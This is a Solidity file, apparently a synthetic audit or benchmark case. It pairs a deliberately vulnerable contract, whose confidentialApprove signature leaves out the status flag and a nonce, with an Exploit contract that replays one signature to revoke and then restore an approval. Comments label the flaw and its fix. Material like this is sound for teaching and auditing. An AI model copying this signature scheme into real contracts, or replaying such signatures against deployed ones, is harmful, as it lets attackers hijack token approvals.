// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// Synthetic reduction of AuditVault #16739 (AZTEC).
/// confidentialApprove authenticates a detached digest but omits status and nonce.
contract NoteRegistryManager {
    mapping(address => mapping(address => bool)) public approved;

    constructor(address owner, address spender) {
        approved[owner][spender] = true;
    }

    function signatureFor(address owner, address spender) public pure returns (bytes32) {
        return keccak256(abi.encode(owner, spender));
    }

    function confidentialApprove(
        address owner,
        address spender,
        bool status,
        bytes32 signature
    ) external {
        bytes32 digest = keccak256(abi.encode(owner, spender));
        require(signature == digest, "invalid owner signature");
        // FIX: include status and a nonce in the signed digest, then consume the nonce.
        approved[owner][spender] = status; // @> VULN: status is detached and the signature has no replay marker.
    }
}

contract Exploit {
    NoteRegistryManager public registry;
    address public noteOwner;
    address public spender;
    bytes32 public detachedSignature;
    bool public revoked;
    bool public replayed;

    constructor() {
        noteOwner = address(0xA11CE);
        spender = address(this);
        registry = new NoteRegistryManager(noteOwner, spender);
        detachedSignature = registry.signatureFor(noteOwner, spender);
    }

    function run() external {
        // A valid approval signature is first used with status=false by an unrelated caller.
        registry.confidentialApprove(noteOwner, spender, false, detachedSignature);
        revoked = !registry.approved(noteOwner, spender);
        // The exact same signature is replayed with status=true to restore permission.
        registry.confidentialApprove(noteOwner, spender, true, detachedSignature);
        replayed = registry.approved(noteOwner, spender);
        require(revoked && replayed, "detached approval signature was not replayable");
    }
}
